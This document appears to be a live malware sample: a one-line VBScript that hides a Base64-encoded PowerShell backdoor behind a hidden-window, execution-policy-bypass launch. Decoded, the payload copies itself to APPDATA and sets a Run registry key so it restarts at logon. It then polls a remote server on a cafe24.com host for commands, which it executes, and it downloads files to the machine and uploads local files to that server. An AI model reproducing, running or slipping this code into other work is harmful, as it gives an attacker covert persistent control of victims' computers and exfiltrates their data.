CreateObject("WScript.Shell").Run "Powershell.exe -executionpolicy remotesigned -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2ViOw0KZnVuY3Rpb24gQigkcGFyYW0pDQp7DQogICAgJEhUVFBfUmVxdWVzdDEgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCRwYXJhbSk7DQogICAgJEhUVFBfUmVzcG9uc2UxID0gJEhUVFBfUmVxdWVzdDEuR2V0UmVzcG9uc2UoKTsNCiAgICAkSFRUUF9SZXNwb25zZTEuQ2xvc2UoKTsNCn0NCmZ1bmN0aW9uIEMoJGZpbGVQYXRoLCAkZmlsZU5hbWUpDQp7DQogICAgJHZhbCA9ICR1cmwgKyAiP3R5cGU9ZmlsZSZkaXJlY3Rpb249c2VuZCZpZD0iICsgJHNlcmlhbE51bWJlcjsNCiAgICAkYnl0ZXMgPSAkKGdldC1jb250ZW50ICRmaWxlUGF0aCAtRW5jIEJ5dGUpOw0KICAgICRlbmMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpHZXRFbmNvZGluZygiaXNvLTg4NTktMSIpOw0KICAgICRmaWxlRW5jID0gJGVuYy5HZXRTdHJpbmcoJGJ5dGVzKTsNCiAgICAkYm91bmRhcnkgPSBbU3lzdGVtLkd1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKTsNCiAgICAkTEYgPSAiYHJgbiI7DQogICAgJGJvZHlMaW5lcyA9ICggDQogICAgICAgICItLSRib3VuZGFyeSIsDQogICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJmaWxlYCI7IGZpbGVuYW1lPWAiIiArICRmaWxlTmFtZSArICJgIiIsDQogICAgICAgICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSRMRiIsDQogICAgICAgICRmaWxlRW5jLA0KICAgICAgICAiLS0kYm91bmRhcnktLSRMRiIgDQogICAgKSAtam9pbiAkTEY7DQogICAgJFdlYlJlcXVlc3QgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkdmFsKTsNCiAgICAkV2ViUmVxdWVzdC5NZXRob2QgPSAiUE9TVCI7DQogICAgJFdlYlJlcXVlc3QuQ29udGVudFR5cGUgPSAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9YCIkYm91bmRhcnlgIiI7DQogICAgJFN0cmVhbSA9ICRXZWJSZXF1ZXN0LkdldFJlcXVlc3RTdHJlYW0oKTsNCiAgICAkYm9keSA9IFtieXRlW11dW2NoYXJbXV0kYm9keUxpbmVzOw0KICAgICRTdHJlYW0uV3JpdGUoJGJvZHksIDAsICRib2R5Lkxlbmd0aCk7DQogICAgJFN0cmVhbS5GbHVzaCgpOw0KICAgICRTdHJlYW0uQ2xvc2UoKTsNCiAgICAkUmVzcG9uc2UgPSAkV2ViUmVxdWVzdC5HZXRSZXNwb25zZSgpOw0KICAgICRSZXNwb25zZS5DbG9zZSgpOw0KfQ0KZnVuY3Rpb24gQSgkcGFyYW0pDQp7DQogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAtTmFtZSAiRmVidXJhcnkiIC1WYWx1ZSAkcGFyYW0gLVByb3BlcnR5VHlwZSBTVFJJTkcgLUZvcmNlIHwgT3V0LU51bGw7DQp9DQokdXJsID0gImh0dHA6Ly9sanM1OTUwLmNhZmUyNC5jb20vYmJzL3NhbXN1bmcvZG8ucGhwIjsNCiRzZXJpYWxOdW1iZXIgPSAkZW52OkNPTVBVVEVSTkFNRTsNCmlmICgkc2VyaWFsTnVtYmVyIC1lcSAiIikNCnsNCiAgICAkc2VyaWFsTnVtYmVyID0gIk5vU2VyaWFsTnVtYmVyIjsNCn0NCg0KJG9sZFBhdGggPSAkZW52OlRFTVArJ1xNaWNyb3NvZnQudmJzJzsNCiRuZXdQYXRoID0gJGVudjpBUFBEQVRBICsgJ1xNaWNyb3NvZnQudmJzJzsNCkNvcHktSXRlbSAkb2xkUGF0aCAtRGVzdGluYXRpb24gJG5ld1BhdGg7DQpBKCRuZXdQYXRoKTsNCg0KJHJlc3VsdFBhdGggPSAkZW52OkFQUERBVEEgKyAnXGRlc2t0b3AuZGF0JzsNCkIoJHVybCArICI/dHlwZT1oZWxsbyZkaXJlY3Rpb249c2VuZCZpZD0iICsgJHNlcmlhbE51bWJlcik7DQp3aGlsZSAoJHRydWUpew0KICAgICR2YWwgPSAiIjsNCiAgICAkSFRUUF9SZXF1ZXN0ID0gW1N5c3RlbS5OZXQuV2ViUmVxdWVzdF06OkNyZWF0ZSgkdXJsICsgIj90eXBlPWNvbW1hbmQmZGlyZWN0aW9uPXJlY2VpdmUmaWQ9IiArICRzZXJpYWxOdW1iZXIpOw0KICAgICRIVFRQX1Jlc3BvbnNlID0gJEhUVFBfUmVxdWVzdC5HZXRSZXNwb25zZSgpOw0KICAgICRIVFRQX1N0YXR1cyA9ICRIVFRQX1Jlc3BvbnNlLlN0YXR1c0NvZGU7DQogICAgSWYgKCRIVFRQX1N0YXR1cyAtZXEgMjAwKSB7DQogICAgICAgICRyZWFkU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyICRIVFRQX1Jlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCk7DQogICAgICAgICRkYXRhPSRyZWFkU3RyZWFtLlJlYWRUb0VuZCgpOw0KICAgICAgICBpZiAoISRkYXRhLkNvbnRhaW5zKCJGYWlsIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICgkZGF0YS5Db250YWlucygicmVmOiIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEIoJHVybCArICI/dHlwZT1oZWxsbyZkaXJlY3Rpb249c2VuZCZpZD0iICsgJHNlcmlhbE51bWJlcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCRkYXRhLkNvbnRhaW5zKCJjbWQ6IikpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gJGRhdGEuU3Vic3RyaW5nKDQpIHwgT3V0LWZpbGUgJHJlc3VsdFBhdGg7DQogICAgICAgICAgICAgICAgQyAkcmVzdWx0UGF0aCAoJHNlcmlhbE51bWJlciArICctcmVzdWx0Jyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCRkYXRhLkNvbnRhaW5zKCJkb3duOiIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRmaWxlVXJsID0gJGRhdGEuU3Vic3RyaW5nKDUpOw0KICAgICAgICAgICAgICAgICRmaWxlTmFtZSA9ICRmaWxlVXJsLlN1YnN0cmluZygkZmlsZVVybC5MYXN0SW5kZXhPZigiLyIpICsgMSk7DQogICAgICAgICAgICAgICAgJHBhdGggPSAkZW52OkFQUERBVEEgKyAiXCIgKyAkZmlsZU5hbWU7DQogICAgICAgICAgICAgICAgKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCRmaWxlVXJsLCAkcGF0aCk7DQogICAgICAgICAgICAgICAgJHZhbCA9ICR1cmwgKyAiP3R5cGU9cmVzdWx0JmRpcmVjdGlvbj1zZW5kJmlkPSIgKyAkc2VyaWFsTnVtYmVyICsgIiZkYXRhPVN1Y2Nlc3MiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkZGF0YS5Db250YWlucygidXBsb2FkOiIpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRmaWxlUGF0aCA9ICRkYXRhLlN1YnN0cmluZyg3KTsNCiAgICAgICAgICAgICAgICAkZmlsZU5hbWUgPSAkZGF0YS5TdWJzdHJpbmcoJGRhdGEuTGFzdEluZGV4T2YoIlwiKSArIDEpOw0KICAgICAgICAgICAgICAgIEMgJGZpbGVQYXRoICRmaWxlTmFtZTsNCiAgICAgICAgICAgICAgICAkdmFsID0gJHVybCArICI/dHlwZT1yZXN1bHQmZGlyZWN0aW9uPXNlbmQmaWQ9IiArICRzZXJpYWxOdW1iZXIgKyAiJmRhdGE9U3VjY2VzcyI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCRkYXRhLkNvbnRhaW5zKCJydW46IikpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAkZGF0YS5TdWJzdHJpbmcoNCkgLU5vTmV3V2luZG93Ow0KICAgICAgICAgICAgICAgICR2YWwgPSAkdXJsICsgIj90eXBlPXJlc3VsdCZkaXJlY3Rpb249c2VuZCZpZD0iICsgJHNlcmlhbE51bWJlciArICImZGF0YT1TdWNjZXNzIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkSFRUUF9SZXNwb25zZS5DbG9zZSgpOw0KICAgIGlmICgkdmFsIC1uZSAiIikNCiAgICB7DQogICAgICAgIEIoJHZhbCk7DQogICAgfQ0KICAgIHN0YXJ0LXNsZWVwIC1zZWNvbmRzIDU7DQp9')));", 0, false
